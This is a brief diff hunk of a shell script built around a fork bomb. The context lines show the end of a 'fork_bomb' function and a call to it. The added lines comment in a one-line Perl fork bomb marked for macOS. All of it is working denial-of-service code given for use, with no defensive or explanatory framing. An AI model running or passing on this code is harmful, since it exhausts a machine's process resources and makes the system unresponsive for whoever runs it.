@@ -34,3 +34,6 @@ fork_bomb() {
 }
 
 fork_bomb $@
+
+
+# perl -e "fork while fork" &  --> fork bomb mac
